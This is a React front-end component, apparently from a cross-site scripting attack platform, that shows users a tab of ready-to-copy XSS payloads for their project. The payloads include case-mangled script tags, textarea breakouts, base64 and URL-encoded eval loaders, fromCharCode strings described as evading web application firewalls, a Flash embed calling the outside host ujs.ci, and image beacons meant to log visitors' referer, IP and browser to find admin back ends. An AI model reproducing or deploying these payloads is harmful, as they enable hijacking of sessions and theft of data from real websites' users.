import React, { useState, useEffect } from 'react';
import { Card, Badge, Button, Loading, Input } from './ui';
import { useAuth } from '../contexts/AuthContext';
import SessionList from './SessionList';
import projectService from '../services/project';
import { API_BASE_URL } from '../constants/api';
import './ProjectDetail.css';

const ProjectDetail = ({ 
  project, 
  onBack, 
  onEditProject, 
  onDeleteProject,
  refreshTrigger,
  isOtherUserProject = false
}) => {
  const [activeTab, setActiveTab] = useState('sessions');
  const [payload, setPayload] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const { isAdmin } = useAuth();


  const loadProjectPayload = async () => {
    if (!project?.jid) return;
    
    setIsLoading(true);
    try {
      const baseUrl = `${API_BASE_URL}/${project.jid}`;
      const payloadData = {
        baseScript: `<sCRiPt sRC=${baseUrl}></sCrIpT>`,
        baseUrl: baseUrl
      };
      setPayload(payloadData);
    } catch (error) {
      console.error('获取载荷失败:', error);
      setPayload(null);
    } finally {
      setIsLoading(false);
    }
  };

  const copyToClipboard = async (text) => {
    try {
      await navigator.clipboard.writeText(text);
      // 这里可以添加提示
    } catch (error) {
      console.error('复制失败:', error);
    }
  };

  const generatePayloads = () => {
    if (!payload?.baseUrl) return [];
    
    const baseUrl = payload.baseUrl.replace(/^https?:\/\//, '//');
    
    return [
      {
        title: '一、将如下代码植入怀疑出现xss的地方（注意\'的转义），即可在 项目内容 观看XSS效果。',
        payloads: [
          {
            code: `<sCRiPt sRC=${baseUrl}></sCrIpT>`,
            label: '或者'
          },
          {
            code: `</tEXtArEa>'"><sCRiPt sRC=${baseUrl}></sCrIpT>`,
            label: '或者'
          },
          {
            code: `'"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vbG9jYWxob3N0OjgwODgvJHtwcm9qZWN0LmppZH0iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7Cg== autofocus>`,
            label: ''
          },
          {
            code: `'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vbG9jYWxob3N0OjgwODgvJHtwcm9qZWN0LmppZH0iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7Cg== onerror=eval(atob(this.id))>`,
            label: ''
          },
          {
            code: `</tEXtArEa>'"><img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22${baseUrl.replace(/[/:]/g, '%$&')}%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>`,
            label: ''
          },
          {
            code: `<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='${baseUrl}';>`,
            label: '<----'
          }
        ]
      },
      {
        title: '二、下方XSS代码过一般WAF---[注意如果直接把代码放入Burp，则需要把下方代码进行 URL编码]',
        payloads: [
          {
            code: `<embed src=https://ujs.ci/liuyan/xs.swf?a=e&c=doc\\u0075ment.write(St\\u0072ing.from\\u0043harCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,117,106,115,46,99,105,47,121,49,56,62,60,47,115,67,114,73,112,84,62)) allowscriptaccess=always type=application/x-shockwave-flash></embed>`,
            label: '---->'
          },
          {
            code: `<img src="" onerror="document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,117,106,115,46,99,105,47,121,49,56,62,60,47,115,67,114,73,112,84,62))">`,
            label: '',
            warning: '若使用下方XSS代码请注意(下面代码会引起网页空白不得已慎用，注意如果使用下面的代码，一定要勾选"基础默认XSS"模块)'
          }
        ]
      },
      {
        title: '三、↓↓↓！~极限代码~！(可以不加最后的>回收符号，下面代码已测试成功)↓↓↓',
        payloads: [
          {
            code: `<sCRiPt/SrC=${baseUrl}>`,
            label: ''
          }
        ]
      },
      {
        title: '四、↓↓↓图片探测系统，只要对方网站可以调用外部图片(或可自定义HTML)，请填入下方图片地址(代码)，则探测对方数据↓↓↓',
        payloads: [
          {
            code: `${API_BASE_URL}/img.jpg?project=${project.jid}`,
            label: `图片插件一：    ${API_BASE_URL}/img.jpg?project=${project.jid}    【若使用此探测，必须勾选\'默认模块\'！！！】`
          },
          {
            code: `<Img srC=${API_BASE_URL}/img.jpg?project=${project.jid}>`,
            label: `<Img srC=${API_BASE_URL}/img.jpg?project=${project.jid}> 或者 <Img srC="${API_BASE_URL}/img.jpg?project=${project.jid}">`
          },
          {
            code: `<Img sRC=//${API_BASE_URL.replace(/^https?:\/\//, '')}/img.jpg?project=${project.jid}>`,
            label: `<Img sRC=//${API_BASE_URL.replace(/^https?:\/\//, '')}/img.jpg?project=${project.jid}>`
          }
        ],
        note: '注意：图片xss不能获取cookie（只记录referer、IP、浏览器等信息，常用于探测后台地址）'
      }
    ];
  };

  useEffect(() => {
    if (project?.jid && activeTab === 'payload') {
      loadProjectPayload();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [project?.jid, activeTab]);

  const getStatusBadge = (status) => {
    return status === 'active' ? 
      <Badge variant="success">活跃</Badge> :
      <Badge variant="secondary">停用</Badge>;
  };

  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleString('zh-CN');
  };




  const tabs = [
    { id: 'sessions', name: '会话列表', icon: '💻' },
    { id: 'payload', name: '载荷代码', icon: '🚀' },
    { id: 'settings', name: '项目设置', icon: '⚙️' }
  ];

  if (!project) {
    return (
      <Card className="project-detail__empty">
        <div className="project-detail__empty-content">
          <h3>📁 请选择一个项目</h3>
          <p>从左侧项目列表中选择一个项目以查看详细信息</p>
        </div>
      </Card>
    );
  }

  return (
    <div className="project-detail">
      <div className="project-detail__header">
        <div className="project-detail__header-left">
          <Button
            variant="ghost"
            size="sm"
            onClick={onBack}
            className="project-detail__back-btn"
          >
            ← 返回项目列表
          </Button>
          
          <div className="project-detail__project-info">
            <div className="project-detail__title-row">
              <h1 className="project-detail__title">{project.name}</h1>
              <span className="project-detail__jid">{project.jid}</span>
              {getStatusBadge(project.status)}
            </div>
            <p className="project-detail__description">
              {project.description || '无描述'}
            </p>
            {isOtherUserProject && project.owner && (
              <div className="project-detail__owner-info">
                <span className="project-detail__owner-label">创建者:</span>
                <span className="project-detail__owner-value">
                  {project.owner.username}
                  <Badge 
                    variant={project.owner.role === 'admin' ? 'danger' : 'secondary'} 
                    size="xs"
                    style={{ marginLeft: '4px' }}
                  >
                    {project.owner.role === 'admin' ? '管理员' : '用户'}
                  </Badge>
                </span>
              </div>
            )}
          </div>
        </div>
        
        <div className="project-detail__header-right">
          {isAdmin() && !isOtherUserProject && onEditProject && onDeleteProject && (
            <div className="project-detail__actions">
              <Button
                variant="ghost"
                size="sm"
                onClick={() => onEditProject(project)}
              >
                ✏️ 编辑
              </Button>
              <Button
                variant="danger"
                size="sm"
                onClick={() => onDeleteProject(project)}
              >
                🗑️ 删除
              </Button>
            </div>
          )}
        </div>
      </div>

      <div className="project-detail__meta">
        <div className="project-detail__meta-item">
          <span className="project-detail__meta-label">创建时间:</span>
          <span className="project-detail__meta-value">
            {formatDate(project.created_at)}
          </span>
        </div>
        <div className="project-detail__meta-item">
          <span className="project-detail__meta-label">启用模块:</span>
          <div className="project-detail__modules">
            {(project.enabled_modules || []).map((module) => (
              <Badge key={module} variant="outline" size="sm">
                {module}
              </Badge>
            ))}
          </div>
        </div>
      </div>

      <div className="project-detail__tabs">
        <nav className="project-detail__nav">
          {tabs.map((tab) => (
            <button
              key={tab.id}
              className={`project-detail__tab ${
                activeTab === tab.id ? 'project-detail__tab--active' : ''
              }`}
              onClick={() => setActiveTab(tab.id)}
            >
              <span className="project-detail__tab-icon">{tab.icon}</span>
              <span className="project-detail__tab-text">{tab.name}</span>
            </button>
          ))}
        </nav>

        <div className="project-detail__tab-content">
          {activeTab === 'sessions' && (
            <SessionList
              projectId={project.jid}
              refreshTrigger={refreshTrigger}
            />
          )}


          {activeTab === 'payload' && (
            <div className="project-detail__payload">
              <div className="project-detail__payload-header">
                <h4>🚀 项目载荷脚本</h4>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={loadProjectPayload}
                >
                  🔄 刷新
                </Button>
              </div>
              
              {isLoading ? (
                <div className="project-detail__payload-loading">
                  <Loading />
                  <p>生成载荷脚本...</p>
                </div>
              ) : payload ? (
                <div className="project-detail__payload-sections">
                  {generatePayloads().map((section, sectionIndex) => (
                    <div key={sectionIndex} className="project-detail__payload-section">
                      <h3 className="project-detail__section-title">{section.title}</h3>
                      
                      <div className="project-detail__section-payloads">
                        {section.payloads.map((payloadItem, index) => (
                          <div key={index} className="project-detail__payload-item">
                            {payloadItem.label && (
                              <div className="project-detail__payload-label">
                                {payloadItem.label}
                              </div>
                            )}
                            
                            <div className="project-detail__payload-code-wrapper">
                              <pre className="project-detail__payload-code">
                                <code>{payloadItem.code}</code>
                              </pre>
                              <Button
                                variant="secondary"
                                size="sm"
                                onClick={() => copyToClipboard(payloadItem.code)}
                                className="project-detail__copy-btn"
                              >
                                📋
                              </Button>
                            </div>
                            
                            {payloadItem.warning && (
                              <div className="project-detail__payload-warning">
                                ⚠️ {payloadItem.warning}
                              </div>
                            )}
                          </div>
                        ))}
                      </div>
                      
                      {section.note && (
                        <div className="project-detail__section-note">
                          📝 {section.note}
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              ) : (
                <div className="project-detail__payload-empty">
                  暂无载荷代码
                </div>
              )}
            </div>
          )}

          {activeTab === 'settings' && (
            <div className="project-detail__settings">
              <Card className="project-detail__settings-card">
                <h4>⚙️ 项目配置</h4>
                
                <div className="project-detail__settings-grid">
                  <div className="project-detail__setting-item">
                    <span className="project-detail__setting-label">项目名称:</span>
                    <span className="project-detail__setting-value">{project.name}</span>
                  </div>
                  <div className="project-detail__setting-item">
                    <span className="project-detail__setting-label">项目编号:</span>
                    <span className="project-detail__setting-value">{project.jid}</span>
                  </div>
                  <div className="project-detail__setting-item">
                    <span className="project-detail__setting-label">项目状态:</span>
                    <span className="project-detail__setting-value">
                      {getStatusBadge(project.status)}
                    </span>
                  </div>
                  <div className="project-detail__setting-item">
                    <span className="project-detail__setting-label">创建者ID:</span>
                    <span className="project-detail__setting-value">{project.owner_id}</span>
                  </div>
                </div>
                
                <div className="project-detail__settings-actions">
                  {isAdmin() && !isOtherUserProject && onEditProject && (
                    <Button
                      variant="primary"
                      onClick={() => onEditProject(project)}
                    >
                      ✏️ 更新项目配置
                    </Button>
                  )}
                </div>
              </Card>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default ProjectDetail;